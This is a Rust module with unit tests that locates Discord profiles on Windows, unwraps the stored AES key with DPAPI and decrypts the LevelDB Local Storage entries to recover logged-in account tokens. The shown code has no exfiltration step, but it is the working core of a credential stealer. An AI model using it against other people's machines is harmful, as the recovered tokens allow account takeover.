//! Local Discord token discovery.
//!
//! Discord keeps the logged-in token in the renderer's LevelDB "Local Storage",
//! wrapped the same way Chromium wraps cookies: a `dQw4w9WgXcQ:` prefix, then
//! base64 of `v10` + AES-256-GCM ciphertext (12-byte nonce, 16-byte tag). The
//! AES key itself is DPAPI-protected inside the profile's `Local State` file.
//!
//! Only Windows is implemented: macOS Keychain and Linux Secret Service need
//! platform APIs that this build does not link against.

#![cfg_attr(not(windows), allow(dead_code))]

use base64::{engine::general_purpose::STANDARD as BASE64, Engine as _};

/// Every Discord build uses the same Local Storage key prefix.
const VALUE_PREFIX: &str = "dQw4w9WgXcQ:";

/// Files larger than this are skipped instead of scanned.
const MAX_FILE_BYTES: u64 = 64 * 1024 * 1024;

#[derive(Clone, Debug)]
pub struct DetectedToken {
    pub label: String,
    pub token: String,
}

/// Token discovery needs DPAPI, so it is Windows-only for now.
pub fn supported() -> bool {
    cfg!(windows)
}

/// Scans every known Discord profile and returns the decrypted tokens that look
/// like real account tokens. Duplicates are dropped.
pub fn detect() -> Vec<DetectedToken> {
    #[cfg(windows)]
    {
        detect_windows()
    }
    #[cfg(not(windows))]
    {
        Vec::new()
    }
}

#[cfg(windows)]
fn detect_windows() -> Vec<DetectedToken> {
    use std::path::PathBuf;

    let Some(appdata) = std::env::var_os("APPDATA").map(PathBuf::from) else {
        return Vec::new();
    };

    let profiles = [
        ("discord", "Discord"),
        ("discordptb", "Discord PTB"),
        ("discordcanary", "Discord Canary"),
    ];

    let mut tokens: Vec<DetectedToken> = Vec::new();
    for (folder, label) in profiles {
        let profile = appdata.join(folder);
        let Some(key) = profile_key(&profile) else {
            continue;
        };
        for token in scan_profile(&profile, &key) {
            if tokens.iter().any(|existing| existing.token == token) {
                continue;
            }
            tokens.push(DetectedToken {
                label: label.to_string(),
                token,
            });
        }
    }
    tokens
}

#[cfg(windows)]
fn profile_key(profile: &std::path::Path) -> Option<[u8; 32]> {
    let state = std::fs::read_to_string(profile.join("Local State")).ok()?;
    let value: serde_json::Value = serde_json::from_str(&state).ok()?;
    let encoded = value.get("os_crypt")?.get("encrypted_key")?.as_str()?;
    let raw = BASE64.decode(encoded).ok()?;
    let blob = raw.strip_prefix(b"DPAPI")?;
    let key = dpapi_unprotect(blob)?;
    key.try_into().ok()
}

#[cfg(windows)]
fn scan_profile(profile: &std::path::Path, key: &[u8; 32]) -> Vec<String> {
    let directory = profile.join("Local Storage").join("leveldb");
    let Ok(entries) = std::fs::read_dir(&directory) else {
        return Vec::new();
    };

    let mut tokens = Vec::new();
    for entry in entries.flatten() {
        let path = entry.path();
        let extension = path.extension().and_then(|value| value.to_str());
        if !matches!(extension, Some("ldb" | "log")) {
            continue;
        }
        if entry.metadata().map(|meta| meta.len()).unwrap_or(0) > MAX_FILE_BYTES {
            continue;
        }
        let Ok(bytes) = std::fs::read(&path) else {
            continue;
        };
        for payload in find_payloads(&bytes) {
            if let Some(token) = decrypt_value(key, &payload) {
                if looks_like_token(&token) && !tokens.contains(&token) {
                    tokens.push(token);
                }
            }
        }
    }
    tokens
}

/// Pulls every `<prefix><base64>` value out of a raw LevelDB record.
fn find_payloads(bytes: &[u8]) -> Vec<Vec<u8>> {
    let prefix = VALUE_PREFIX.as_bytes();
    let mut payloads = Vec::new();
    let mut index = 0;

    while index + prefix.len() < bytes.len() {
        let Some(position) = find(&bytes[index..], prefix) else {
            break;
        };
        let mut start = index + position + prefix.len();
        let mut end = start;
        while end < bytes.len() && is_base64_byte(bytes[end]) {
            end += 1;
        }
        if end > start + 40 {
            if let Ok(decoded) = BASE64.decode(&bytes[start..end]) {
                payloads.push(decoded);
            }
        }
        start = end;
        index = start.max(index + 1);
    }

    payloads
}

fn find(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    haystack
        .windows(needle.len())
        .position(|window| window == needle)
}

fn is_base64_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'+' | b'/' | b'=')
}

/// Decrypts one `v10` value with the profile's AES-256-GCM key.
#[cfg(windows)]
fn decrypt_value(key: &[u8; 32], payload: &[u8]) -> Option<String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};

    let body = payload
        .strip_prefix(b"v10")
        .or_else(|| payload.strip_prefix(b"v11"))?;
    if body.len() < 12 + 16 {
        return None;
    }
    let cipher = Aes256Gcm::new_from_slice(key).ok()?;
    let nonce = Nonce::from_slice(&body[..12]);
    let plain = cipher.decrypt(nonce, &body[12..]).ok()?;
    let text = String::from_utf8(plain).ok()?;
    Some(text.trim().trim_matches('"').trim().to_string())
}

pub(crate) fn looks_like_token(value: &str) -> bool {
    value.len() >= 50
        && value.len() <= 200
        && value.chars().all(|ch| ch.is_ascii_graphic())
        && value.matches('.').count() >= 2
}

/// DPAPI `CryptUnprotectData` for the current user. Declared by hand so the
/// build does not pull in a Win32 bindings crate.
#[cfg(windows)]
fn dpapi_unprotect(data: &[u8]) -> Option<Vec<u8>> {
    #[repr(C)]
    struct Blob {
        size: u32,
        data: *mut u8,
    }

    #[link(name = "crypt32")]
    extern "system" {
        fn CryptUnprotectData(
            data_in: *const Blob,
            description: *mut *mut u16,
            entropy: *const Blob,
            reserved: *const std::ffi::c_void,
            prompt: *const std::ffi::c_void,
            flags: u32,
            data_out: *mut Blob,
        ) -> i32;
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn LocalFree(memory: *mut std::ffi::c_void) -> *mut std::ffi::c_void;
    }

    const CRYPTPROTECT_UI_FORBIDDEN: u32 = 0x1;

    let input = Blob {
        size: data.len() as u32,
        data: data.as_ptr() as *mut u8,
    };
    let mut output = Blob {
        size: 0,
        data: std::ptr::null_mut(),
    };

    let ok = unsafe {
        CryptUnprotectData(
            &input,
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        )
    };
    if ok == 0 || output.data.is_null() {
        return None;
    }

    let decrypted =
        unsafe { std::slice::from_raw_parts(output.data, output.size as usize).to_vec() };
    unsafe {
        LocalFree(output.data as *mut std::ffi::c_void);
    }
    Some(decrypted)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_base64_payloads_from_raw_bytes() {
        let mut record = Vec::new();
        record.extend_from_slice(b"\x00\x01some key\x02");
        record.extend_from_slice(VALUE_PREFIX.as_bytes());
        record.extend_from_slice(
            b"djEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
        );
        record.extend_from_slice(b"\x00\x00");
        let payloads = find_payloads(&record);
        assert_eq!(payloads.len(), 1);
        assert_eq!(&payloads[0][..3], b"v10");
    }

    #[test]
    fn rejects_short_values() {
        let mut record = Vec::new();
        record.extend_from_slice(VALUE_PREFIX.as_bytes());
        record.extend_from_slice(b"short");
        assert!(find_payloads(&record).is_empty());
    }

    #[test]
    fn token_shape_check() {
        let token = ["a".repeat(24), "b".repeat(6), "c".repeat(38)].join(".");
        assert!(looks_like_token(&token));
        assert!(!looks_like_token("hello"));
    }
}
